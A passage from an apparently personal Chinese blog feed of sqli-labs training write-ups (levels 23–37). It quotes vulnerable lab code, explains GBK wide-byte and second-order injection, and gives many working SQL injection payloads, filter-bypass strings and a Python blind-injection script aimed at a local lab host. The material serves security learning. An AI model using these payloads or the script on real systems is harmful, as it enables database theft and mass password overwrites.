class="headerlink" title="less-30"></a>less-30</h3><p>是29的双引号版本</p><h3 id="less-31"><a href="#less-31" class="headerlink" title="less-31"></a>less-31</h3><p>是29的&quot;)版本</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>id<span class="operator">=</span>&quot;) union select 1,version(),database()--+</span><br></pre></td></tr></table></figure><h2 id="less-32"><a href="#less-32" class="headerlink" title="less-32"></a>less-32</h2><p>这关jsp直接连接mysql,先关掉jspstudy的mysql服务,修改jsp脚本里的连接参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">connection = DriverManager.getConnection(connectionURL, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;toor&quot;</span>);<span class="comment">//toor修改为mysql密码</span></span><br><span class="line"><span class="type">String</span> <span class="variable">queryString</span> <span class="operator">=</span> <span class="string">&quot;SELECT * FROM users where id=(&#x27;&quot;</span>+id+<span class="string">&quot;&#x27;) LIMIT 0,1&quot;</span>;</span><br><span class="line">pstatement = connection.createStatement();</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> pstatement.executeQuery(queryString);</span><br><span class="line"><span class="keyword">while</span>(rs.next())</span><br><span class="line">&#123;</span><br><span class="line">out.print(<span class="string">&quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;</span>);</span><br><span class="line">out.print(<span class="string">&quot;Username: &quot;</span>+rs.getString(<span class="number">2</span>));</span><br><span class="line">out.print(<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">out.print(<span class="string">&quot;Password: &quot;</span>+rs.getString(<span class="number">3</span>));</span><br><span class="line">out.print(<span class="string">&quot;&lt;/font&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用&quot;&#39;)闭合</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot;&#x27;) union select 1,@@basedir,@@datadir;--+</span><br></pre></td></tr></table></figure><h2 id="less-33"><a href="#less-33" class="headerlink" title="less-33"></a>less-33</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在查表前</span></span><br><span class="line"><span class="title function_ invoke__">mysql_query</span>(<span class="string">&quot;SET NAMES gbk&quot;</span>);</span><br><span class="line"><span class="comment">//设置客户端与服务器之间通信时使用的字符编码为GBK</span></span><br></pre></td></tr></table></figure><p>GBK编码的字符有单字节和双字节两种表示方式：<br>[00,7F]范围内只读一个字节，与ASCII码一致。<br>第一字节属于[81,FE]就判断为双字节，第二字节在[40,FE]范围内</p><p>\  5C<br>&#39;  27<br>縗 bf5c<br>0%bf&#39; 30bf5c27<br>php在27前插入5c，变成30bf5c27，再传给mysql<br>mysql读到bf 按照gbk规则，这是双字节字符，并掉了5c 反斜杠</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">0</span><span class="operator">%</span>bf<span class="string">&#x27; union select 1,2,3--+</span></span><br></pre></td></tr></table></figure><h2 id="less-34"><a href="#less-34" class="headerlink" title="less-34"></a>less-34</h2><p>hex编辑AB 5C 保存至文本，vscode打开文本，右下角，以gbk重新打开<br>AB的二进制是 10101011 按照utf-8的规则，没有这个字符，于是变成�\</p><table><thead><tr><th>unicode</th><th>utf-8 <a href="https://segmentfault.com/a/1190000039294107">表格引用链接</a></th></tr></thead><tbody><tr><td>0000 0000-0000 007F</td><td>0xxxxxxx</td></tr><tr><td>0000 0080-0000 07FF</td><td>110xxxxx 10xxxxxx</td></tr><tr><td>0000 0800-0000 FFFF</td><td>1110xxxx 10xxxxxx 10xxxxxx</td></tr><tr><td>0001 0000-0010 FFFF</td><td>11110xxx 10xxxxxx 10xxxxxx 10xxxxxx</td></tr><tr><td>将unicode码点的二进制依次填入对应范围的utf-8的x里，完成转换</td><td></td></tr></tbody></table><blockquote><p>�的uniocde码点是FFFD 1111 1111 1111 1101<br>命中0000 0800-0000 FFFF<br> <strong>1110</strong>xxxx <strong>10</strong>xxxxxx <strong>10</strong>xxxxxx<br> <strong>1110</strong>1111 <strong>10</strong>111111 <strong>10</strong>111101<br> EF   BF  BD</p></blockquote><ul><li>�的HEX都是EF BF BD  </li><li>�\ HEX: EF BF BD 5C -gbk-&gt;锟絓  </li><li>再utf-8下编辑:����� HEX:EFBF BDEF BFBD EFBF BDEF BFBD EFBF BD  </li><li>以gbk重新打开:锟斤拷锟斤拷锟� 最后的�也是gbk找不到单独  的BD来造成的，保存后会变成普通?<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">usrname: �<span class="string">&#x27; or 1#</span></span><br><span class="line"><span class="string">usrname: ⛅&#x27;</span> <span class="keyword">or</span> id<span class="operator">=</span><span class="number">11</span># 末尾大于<span class="number">81</span>的<span class="number">3</span>字节字符都可以使用</span><br><span class="line">随<span class="number">1</span>便<span class="string">&#x27; or id=11#</span></span><br></pre></td></tr></table></figure></li></ul><textarea class="form-control" id="enInput" cols="20" rows="5"  placeholder="" style="background: rgb(43, 43, 43);color: rgb(206, 206, 206);"></textarea><textarea class="form-control" id="midRST" cols="20" rows="5" placeholder="" style="background: rgb(43, 43, 43);color: rgb(206, 206, 206);"></textarea><script>    document.getElementById("enInput").value='⛅�';    document.getElementById("midRST").value='%E2%9B%85%EF%BF%BD';    function encodeurl(){        let s=document.getElementById("enInput").value;        document.getElementById("midRST").value=encodeURIComponent(s);    }    el=document.getElementById('enInput')    el.addEventListener("input", function () {                        encodeurl(this);                        }, false);    el.addEventListener("selectionchange", function () {                        encodeurl(this);                        }, false);</script><h3 id="less-35"><a href="#less-35" class="headerlink" title="less-35"></a>less-35</h3><p>gbk但是数字注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union select%20 1,2,3--+</span><br></pre></td></tr></table></figure><h3 id="less-36"><a href="#less-36" class="headerlink" title="less-36"></a>less-36</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=%bb&#x27; or id=11--+</span><br></pre></td></tr></table></figure><h3 id="less-37"><a href="#less-37" class="headerlink" title="less-37"></a>less-37</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usrname: 和<span class="number">34</span>差不多<span class="string">&#x27; or id=11#</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> sqli </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> sqli </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs,less-23到27</title>
      <link href="/2024/11/24/%E5%AD%A6/sqli-labs/sqli-labs-less-23-27/"/>
      <url>/2024/11/24/%E5%AD%A6/sqli-labs/sqli-labs-less-23-27/</url>
      
        <content type="html"><![CDATA[<h2 id="less-23"><a href="#less-23" class="headerlink" title="less-23"></a>less-23</h2><p>后端过滤&#39;--&#39;和&#39;#&#39;</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$reg</span> = <span class="string">&quot;/#/&quot;</span>;</span><br><span class="line"><span class="variable">$reg1</span> = <span class="string">&quot;/--/&quot;</span>;</span><br><span class="line"><span class="variable">$replace</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$reg</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$reg1</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>构造</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,&#x27;</span><span class="number">3</span></span><br><span class="line">拼接后就是</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="string">&#x27;&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">&#x27;3&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">爆库名</span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(schema_name),database() from information_schema.schemata where 1=1 or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span></span><br><span class="line">拼接后</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="string">&#x27;-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(schema_name),database() <span class="keyword">from</span> information_schema.schemata <span class="keyword">where</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="less-24-二次注入-盲注"><a href="#less-24-二次注入-盲注" class="headerlink" title="less-24 二次注入+盲注"></a>less-24 二次注入+盲注</h2><p>mysql_real_escape_string()会转义这些字符  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x00  \n  \r   \  &#x27;  &quot;  \x1a</span><br></pre></td></tr></table></figure><p>但是pass_change.php文件下的sql语句使用的username来自数据库存储的用户名，白转义了导致<br><button></button></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//longin.php（节选）</span></span><br><span class="line">unction <span class="title function_ invoke__">sqllogin</span>()&#123;</span><br><span class="line">   <span class="variable">$username</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line">   <span class="variable">$password</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>]);</span><br><span class="line">   <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line">   <span class="variable">$res</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">   <span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_row</span>(<span class="variable">$res</span>);</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="number">1</span>]) &#123;<span class="keyword">return</span> <span class="variable">$row</span>[<span class="number">1</span>];</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$login</span> = <span class="title function_ invoke__">sqllogin</span>();</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>] = <span class="variable">$login</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//pass_change.php</span></span><br><span class="line"><span class="variable">$username</span>= <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;</span><br></pre></td></tr></table></figure><p>创建用户 <strong>&#39; or 1#</strong> 登陆后修改密码，会显示失败(返回多行导致的，见下面语句)，但是所有用户的密码被修改。<br>使用用户名： <strong>&#39; or id&#x3D;1#</strong> 修改密码回显正常，只有Dumb密码被改</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>==<span class="number">1</span>) <span class="keyword">echo</span> <span class="string">&quot;Password successfully updated&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="盲注-这就是我们热血沸腾的组合技！"><a href="#盲注-这就是我们热血沸腾的组合技！" class="headerlink" title="盲注 这就是我们热血沸腾的组合技！"></a>盲注 这就是我们热血沸腾的组合技！</h3><p>用户名长度有限制，反正都看源码了，可以利用原密码输入框($curr_pass)进一步注入</p><ul><li>1.注册用户。<blockquote><p>用户名：&#39;&#x2F;*<br>密码：1</p></blockquote></li><li>2.登陆并更改密码。<blockquote><p>原密码：*&#x2F;or id&#x3D;1#<br>新密码: 用布尔盲注则不能与上一个重复</p></blockquote></li></ul><p>reset提交后less-1查看id&#x3D;1的密码成功被更改。</p><h4 id="真是羁羁又绊绊"><a href="#真是羁羁又绊绊" class="headerlink" title="真是羁羁又绊绊"></a>真是羁羁又绊绊</h4><p>mysql_real_escape_string并不会过滤&#39;#&#39;和&#39;&#x2F;*&#39; 利用&#x2F;**&#x2F;组合技注释掉$curr_pass前面的引号实现注入</br></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 原语句</span></span><br><span class="line"><span class="keyword">UPDATE</span> users <span class="keyword">SET</span> PASSWORD<span class="operator">=</span><span class="string">&#x27;$pass&#x27;</span> <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;$username&#x27;</span> <span class="keyword">and</span> password<span class="operator">=</span><span class="string">&#x27;$curr_pass&#x27;</span>;</span><br><span class="line"><span class="comment">-- 拼接后</span></span><br><span class="line"><span class="keyword">UPDATE</span> users <span class="keyword">SET</span> PASSWORD<span class="operator">=</span><span class="string">&#x27;$pass&#x27;</span> <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;&#x27;</span><span class="comment">/*&#x27; and password=&#x27;*/</span><span class="keyword">or</span> id<span class="operator">=</span><span class="number">1</span>#<span class="string">&#x27;;</span></span><br></pre></td></tr></table></figure><p><strong>在原密码框里输入语句就可以盲注了，因为正在更新users表，不能select from users</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 数据库名</span></span><br><span class="line"><span class="operator">*</span><span class="operator">/</span><span class="keyword">or</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> if((<span class="number">120</span><span class="operator">&gt;</span> ASCII(SUBSTR( (<span class="keyword">select</span> database()) ,<span class="number">1</span>,<span class="number">1</span>))),sleep(<span class="number">5</span>),<span class="number">0</span>)#</span><br><span class="line"><span class="comment">-- 当前数据库表名</span></span><br><span class="line"><span class="operator">*</span><span class="operator">/</span><span class="keyword">or</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> if((<span class="number">120</span><span class="operator">&gt;</span> ASCII(SUBSTR( (<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()) ,<span class="number">1</span>,<span class="number">1</span>))),sleep(<span class="number">5</span>),<span class="number">0</span>)#</span><br></pre></td></tr></table></figure><h4 id="py-requests时间-布尔盲注获取表名"><a href="#py-requests时间-布尔盲注获取表名" class="headerlink" title="py requests时间\布尔盲注获取表名"></a>py requests时间\布尔盲注获取表名</h4><details><summary><font color='yellowgreen'>py脚本(展开)</font></summary><p>不知道为什么requests的.elapsed.total_seconds()有时绝对不会返回准确的等待时间（等待两秒，返回0.002秒），重启前还好好的。<br>用timeout&#x3D;(1)或time.time()求时间差解决的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> fnmatch</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmptst_时间盲注</span>(<span class="params">c,idx=<span class="number">0</span></span>): </span><br><span class="line">    idx=<span class="built_in">str</span>(idx)  </span><br><span class="line">    sql=<span class="string">&quot;*/or id=1 and if((&quot;</span>+<span class="built_in">str</span>(c)+<span class="string">&quot;&gt; ASCII(SUBSTR( (select group_concat(table_name) from information_schema.tables where table_schema=database()) ,&quot;</span>+idx+<span class="string">&quot;,1))),sleep(1),0)#&quot;</span></span><br><span class="line">    data=&#123;<span class="string">&#x27;current_password&#x27;</span>:sql,<span class="string">&#x27;password&#x27;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&#x27;re_password&#x27;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&#x27;submit&#x27;</span>:<span class="string">&quot;Reset&quot;</span>&#125; </span><br><span class="line">    cookie= &#123;<span class="comment">#用户名 &#x27;/* 密码 1 先登陆一遍cookie复制过来模拟登陆</span></span><br><span class="line"><span class="string">&quot;Auth&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line"><span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;q843bi0ov67jfv2rsjcmqahdi1&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">    url=<span class="string">&quot;http://192.168.86.131/sqli-labs/Less-24/pass_change.php&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.post(url=url,data=data,cookies=cookie,timeout=(<span class="number">1</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmptst</span>(<span class="params">c,idx=<span class="number">0</span></span>):</span><br><span class="line">    idx=<span class="built_in">str</span>(idx)  </span><br><span class="line">    sql=<span class="string">&quot;*/or id=1 and (&quot;</span>+<span class="built_in">str</span>(c)+<span class="string">&quot;&gt; ASCII(SUBSTR( (select group_concat(table_name) from information_schema.tables where table_schema=database()) ,&quot;</span>+idx+<span class="string">&quot;,1)))#&quot;</span></span><br><span class="line">    </span><br><span class="line">    data=&#123;<span class="string">&#x27;current_password&#x27;</span>:sql,<span class="string">&#x27;password&#x27;</span>:c,<span class="string">&#x27;re_password&#x27;</span>:c,<span class="string">&#x27;submit&#x27;</span>:<span class="string">&quot;Reset&quot;</span>&#125; <span class="comment">#这里要不断改变新密码的值，两次密码相同，改动的行数是0,导致运行成功但回显失败，可以用uuid</span></span><br><span class="line">    cookie= &#123;<span class="comment">#用户名 &#x27;/* 密码 1 先登陆一遍cookie复制过来模拟登陆</span></span><br><span class="line"><span class="string">&quot;Auth&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line"><span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;q843bi0ov67jfv2rsjcmqahdi1&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">    url=<span class="string">&quot;http://192.168.86.131/sqli-labs/Less-24/pass_change.php&quot;</span></span><br><span class="line">    res=requests.post(url=url,data=data,cookies=cookie)</span><br><span class="line">    t=fnmatch.fnmatch(res.text,<span class="string">&#x27;*successfully*&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> <span class="keyword">if</span>(t) <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find</span>(<span class="params">l,r,cmp,idx</span>): </span><br><span class="line">    p=r//<span class="number">2</span> - l</span><br><span class="line">    <span class="keyword">while</span>(r-l&gt;<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span>(cmp(p , idx)):<span class="comment">#大于</span></span><br><span class="line">            r=p</span><br><span class="line">            p=p-(p-l)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l=p</span><br><span class="line">            p=p+(r-p)//<span class="number">2</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">chr</span>(l)</span><br><span class="line"></span><br><span class="line">a=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    a+=find(<span class="number">0</span>,<span class="number">127</span>,cmptst,i)</span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="有问题的方法"><a href="#有问题的方法" class="headerlink" title="有问题的方法"></a>有问题的方法</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">cmptst</span>(<span class="params">c,idx=<span class="number">0</span></span>):</span><br><span class="line">    idx=<span class="built_in">str</span>(idx)  </span><br><span class="line">    sql=<span class="string">&quot;*/or id=1 and if((&quot;</span>+<span class="built_in">str</span>(c)+<span class="string">&quot;&gt; ASCII(SUBSTR( (select group_concat(table_name) from information_schema.tables where table_schema=database()) ,&quot;</span>+idx+<span class="string">&quot;,1))),sleep(1),0)#&quot;</span></span><br><span class="line">    data=&#123;<span class="string">&#x27;current_password&#x27;</span>:sql,<span class="string">&#x27;password&#x27;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&#x27;re_password&#x27;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&#x27;submit&#x27;</span>:<span class="string">&quot;Reset&quot;</span>&#125; </span><br><span class="line">    cookie= &#123;<span class="comment">#用户名 &#x27;/* 密码 1 先登陆一遍cookie复制过来模拟登陆</span></span><br><span class="line"><span class="string">&quot;Auth&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line"><span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;sg25k4c9r4q9q9e35gcvgdkof6&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">    url=<span class="string">&quot;http://192.168.86.131/sqli-labs/Less-24/pass_change.php&quot;</span></span><br><span class="line">    start_time = time.time()</span><br><span class="line">    res=requests.post(url=url,data=data,cookies=cookie)</span><br><span class="line">    end_time = time.time()</span><br><span class="line">    ttt=end_time-start_time</span><br><span class="line">    <span class="built_in">print</span>(ttt)</span><br><span class="line">    <span class="built_in">print</span>(res.elapsed.total_seconds())<span class="comment">#这里不是准确时间（永远小于1）</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> <span class="keyword">if</span>(ttt&gt;<span class="number">1</span>) <span class="keyword">else</span> <span class="number">0</span></span><br></pre></td></tr></table></figure></details><h2 id="less-25"><a href="#less-25" class="headerlink" title="less-25"></a>less-25</h2><p>下方提示去除了and和or，使用an<strong>and</strong>d绕过<br>去除<strong>and</strong>后变为and，oorr也是</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;oorr id=1 --+</span></span><br></pre></td></tr></table></figure><h3 id="less-25a"><a href="#less-25a" class="headerlink" title="less-25a"></a>less-25a</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> anandd <span class="number">1</span><span class="operator">=</span><span class="number">0</span></span><br></pre></td></tr></table></figure><h2 id="less-26"><a href="#less-26" class="headerlink" title="less-26"></a>less-26</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//[]匹配 其中单个字符：[ab]单个a也会匹配</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out #</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out spaces</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out slashes</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 %0b 替代空格<br>|| &amp;&amp;代替and or &amp;是url分隔get参数的，用%26代替</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;%26%26&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line"><span class="comment">-- less-23</span></span><br><span class="line"><span class="number">0</span><span class="string">&#x27; %0B union %0B select %0B 1,version(),&#x27;</span><span class="number">3</span></span><br><span class="line"><span class="string">&#x27; union select 1,group_concat(schema_name),database() from 